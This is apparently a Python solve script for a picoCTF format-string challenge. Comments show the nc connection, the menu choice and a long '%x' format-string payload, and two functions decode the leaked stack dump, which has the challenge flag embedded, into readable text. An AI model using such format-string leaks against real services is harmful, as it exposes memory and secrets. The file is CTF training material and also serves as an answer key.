
# nc mercury.picoctf.net 59614
# 1. Buy
# %x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x

def try1():
    hex = "85073f0-804b000-80489c3-f7f01d80-ffffffff-1-8505160-f7f0f110-f7f01dc7-0-8506180-1-85073d0-85073f0-6f636970-7b465443-306c5f49-345f7435-6d5f6c6c-306d5f79-5f79336e-38343136-34356562-fffe007d-f7f3caf8-f7f0f440-38042600-1-0-f7d9ece9-f7f100c0-f7f015c0-f7f01000-fffe1f88-f7d8f68d-f7f015c0-8048eca-fffe1f94-0-f7f23f09-804b000-f7f01000-f7f01e20-fffe1fc8-f7f29d50-f7f02890-38042600-f7f01000-804b000-fffe1fc8-8048c86-8505160-fffe1fb4-fffe1fc8-8048be9-f7f013fc-0-fffe207c-fffe2074-1-1-8505160-38042600-fffe1fe0-0-0-f7d44fa1-f7f01000-f7f01000-0-f7d44fa1-1-fffe2074-fffe207c-fffe2004-1-0-f7f01000-f7f2470a-f7f3c000-0-f7f01000-0-0-829d218b-d63c279b-0-0-0-1-8048630-0-f7f29d50-f7f24960-804b000-1-8048630-0-8048662-8048b85"
    hex = hex.replace("-", "")

    for i in range(0, len(hex), 2):
        char = int(hex[i:i+2], 16)
        res = ""
        if char >= 32 and char <= 126:
            res = res + res + chr(char) + res
        print(res, end="")


def try2():
    hex = "85073f0-804b000-80489c3-f7f01d80-ffffffff-1-8505160-f7f0f110-f7f01dc7-0-8506180-1-85073d0-85073f0-6f636970-7b465443-306c5f49-345f7435-6d5f6c6c-306d5f79-5f79336e-38343136-34356562-fffe007d-f7f3caf8-f7f0f440-38042600-1-0-f7d9ece9-f7f100c0-f7f015c0-f7f01000-fffe1f88-f7d8f68d-f7f015c0-8048eca-fffe1f94-0-f7f23f09-804b000-f7f01000-f7f01e20-fffe1fc8-f7f29d50-f7f02890-38042600-f7f01000-804b000-fffe1fc8-8048c86-8505160-fffe1fb4-fffe1fc8-8048be9-f7f013fc-0-fffe207c-fffe2074-1-1-8505160-38042600-fffe1fe0-0-0-f7d44fa1-f7f01000-f7f01000-0-f7d44fa1-1-fffe2074-fffe207c-fffe2004-1-0-f7f01000-f7f2470a-f7f3c000-0-f7f01000-0-0-829d218b-d63c279b-0-0-0-1-8048630-0-f7f29d50-f7f24960-804b000-1-8048630-0-8048662-8048b85"
    parts = hex.split("-")

    for part in parts:
        res = ""
        for i in range(0, len(part), 2):
            char = int(part[i:i+2], 16)
            if char >= 32 and char <= 126:
                res = chr(char) + res
        print(res, end="")


if __name__ == "__main__":
    try2()
